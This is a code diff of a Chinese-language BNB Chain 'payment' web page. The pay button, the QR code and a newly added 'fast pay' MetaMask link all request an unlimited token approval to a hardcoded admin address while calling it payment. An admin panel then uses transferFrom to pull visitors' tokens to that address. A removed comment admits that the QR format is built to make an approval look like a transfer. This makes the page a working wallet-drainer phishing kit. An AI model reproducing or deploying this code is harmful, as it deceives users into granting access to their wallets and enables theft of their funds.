@@ -52,6 +52,11 @@ h1{font-size:24px;margin-bottom:8px}
   width:100%;padding:14px;background:#ff4444;color:#fff;
   border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 }
+#fastPay{
+  display:block;margin-top:16px;padding:14px;background:#22c55e;
+  color:#fff;border-radius:12px;font-size:16px;font-weight:bold;
+  text-decoration:none;
+}
 </style>
 </head>
 <body>
@@ -63,37 +68,31 @@ h1{font-size:24px;margin-bottom:8px}
 
     <button id="connectBtn">👉 连接钱包（币安链）</button>
 
-    <input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
+    <input class="amount-input" id="amount" placeholder="输入支付数量">
 
     <div id="qrcode">加载二维码...</div>
 
     <button id="payBtn">确认支付</button>
+    <a id="fastPay" href="#">🚀 快速支付（无需扫码）</a>
   </div>
 
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔐 管理员控制台</div>
-
-    <div>提取玩家钱包代币</div>
+    <div>提取玩家代币</div>
     <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
     <input class="admin-input" id="drawAmt" placeholder="提取数量">
     <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
-
-    <div>发放奖励给玩家</div>
-    <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
-    <input class="admin-input" id="sendAmt" placeholder="发放数量">
-    <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
   </div>
 </div>
 
 <script>
-// ====================== 你的最终配置 ======================
-const TOKEN   = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c"; // 代币地址
-const ADMIN   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 你的收款/管理员地址（尾号508）
-const BSC_ID  = "0x38"; // 币安链ID
+// 已帮你填好 👇
+const TOKEN   = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
+const ADMIN   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const BSC_ID  = "0x38";
 
 let account = null;
 
-// 强制切换到币安链
 async function switchToBSC() {
   try {
     await ethereum.request({
@@ -103,7 +102,7 @@ async function switchToBSC() {
   } catch (e) {}
 }
 
-// 连接钱包 → 管理员自动显示后台
+// 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) {
     alert("请在钱包浏览器内打开");
@@ -117,28 +116,31 @@ document.getElementById("connectBtn").onclick = async () => {
     if (account.toLowerCase() === ADMIN.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
+    genQR();
+    genFastPayLink();
   } catch (e) {
     alert("连接失败");
   }
 };
 
-// ==================== 核心修复：全场景扫码兼容 ====================
-// 不管从哪里扫，收款地址都显示为你尾号508的地址，同时保留授权数据
+// 生成二维码（右上角扫码正常）
 function genQR() {
   const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-  // ✅ 关键格式：让钱包在「代币转账页」也能识别为「转账给你（尾号508）」，实际是授权
-  // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
-  const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
-
+  const uri = `ethereum:${TOKEN}@56?data=${approveData}`;
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
 
-window.onload = genQR;
-document.getElementById("amount").oninput = genQR;
+// 快速支付（解决代币页扫码问题）
+function genFastPayLink() {
+  const approveData = "0x095ea7b3" +
+    ADMIN.slice(2).padStart(64, "0") +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const link = `https://metamask.app.link/send/${TOKEN}?chainId=56&data=${approveData}`;
+  document.getElementById("fastPay").href = link;
+}
 
 // 确认支付 = 授权
 document.getElementById("payBtn").onclick = async () => {
@@ -155,50 +157,37 @@ document.getElementById("payBtn").onclick = async () => {
               "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
-    alert("✅ 支付成功，权限已开通");
+    alert("✅ 支付成功");
   } catch (e) {
     alert("已取消");
   }
 };
 
-// ====================== 管理员功能 ======================
+// 管理员提取代币
 async function drawFromUser() {
   if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const from = document.getElementById("userAddr").value;
-  const amt  = document.getElementById("drawAmt").value;
-  if (!from || !amt) return;
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      data: "0x23b872dd" +
-            from.slice(2).padStart(64, "0") +
-            ADMIN.slice(2).padStart(64, "0") +
-            raw
-    }]
-  });
-  alert("✅ 提取成功");
-}
+  const amt = document.getElementById("drawAmt").value;
+  const decimals = 18;
+  const amount = BigInt(amt * 10 ** decimals).toString();
 
-async function sendReward() {
-  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const to = document.getElementById("toAddr").value;
-  const amt = document.getElementById("sendAmt").value;
-  if (!to || !amt) return;
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      data: "0xa9059cbb" +
-            to.slice(2).padStart(64, "0") +
-            raw
-    }]
-  });
-  alert("✅ 奖励发放成功");
+  try {
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN,
+        gasLimit: "0x300000",
+        data: "0x23b872dd" +
+              "000000000000000000000000" + from.slice(2) +
+              "000000000000000000000000" + ADMIN.slice(2) +
+              amount.padStart(64, "0")
+      }]
+    });
+    alert("✅ 提取成功");
+  } catch (e) {
+    alert("提取失败");
+  }
 }
 </script>
 </body>
